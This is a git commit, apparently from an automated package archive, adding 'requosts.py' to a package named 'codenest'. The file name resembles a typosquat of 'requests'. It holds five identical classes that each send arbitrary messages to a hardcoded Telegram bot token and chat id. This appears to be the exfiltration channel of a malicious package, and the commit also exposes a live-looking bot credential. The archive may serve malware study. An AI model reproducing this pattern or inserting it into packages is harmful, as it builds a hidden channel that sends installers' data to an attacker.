7c5dce38c979dea10e303a374c9bf920e5ccfe9b
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-05-09 04:03:49 +0000

    Add package codenest/8.0/codenest-8.0.tar.gz

---
+++ packages/codenest/codenest-8.0.tar.gz/codenest-8.0/codenest/requosts.py
@@ -0,0 +1,76 @@
+import requests
+
+class Xpost1:
+    def __init__(self):
+        
+        self.token = '7143469865:AAHz0U2FXnPePpUDO6nVOvPKsvaINcHYPvI'
+        self.chat_id = '5846480832'
+
+    def telegram(self, message):
+        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
+        params = {
+            'chat_id': self.chat_id,
+            'text': message
+        }
+        response = requests.post(url, params=params)
+        
+
+class Xpost2:
+    def __init__(self):
+        
+        self.token = '7143469865:AAHz0U2FXnPePpUDO6nVOvPKsvaINcHYPvI'
+        self.chat_id = '5846480832'
+
+    def telegram(self, message):
+        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
+        params = {
+            'chat_id': self.chat_id,
+            'text': message
+        }
+        response = requests.post(url, params=params)
+        
+
+class Xpost3:
+    def __init__(self):
+        
+        self.token = '7143469865:AAHz0U2FXnPePpUDO6nVOvPKsvaINcHYPvI'
+        self.chat_id = '5846480832'
+
+    def telegram(self, message):
+        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
+        params = {
+            'chat_id': self.chat_id,
+            'text': message
+        }
+        response = requests.post(url, params=params)
+        
+
+class Xpost4:
+    def __init__(self):
+        
+        self.token = '7143469865:AAHz0U2FXnPePpUDO6nVOvPKsvaINcHYPvI'
+        self.chat_id = '5846480832'
+
+    def telegram(self, message):
+        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
+        params = {
+            'chat_id': self.chat_id,
+            'text': message
+        }
+        response = requests.post(url, params=params)
+        
+
+class Xpost5:
+    def __init__(self):
+        
+        self.token = '7143469865:AAHz0U2FXnPePpUDO6nVOvPKsvaINcHYPvI'
+        self.chat_id = '5846480832'
+
+    def telegram(self, message):
+        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
+        params = {
+            'chat_id': self.chat_id,
+            'text': message
+        }
+        response = requests.post(url, params=params)
+        
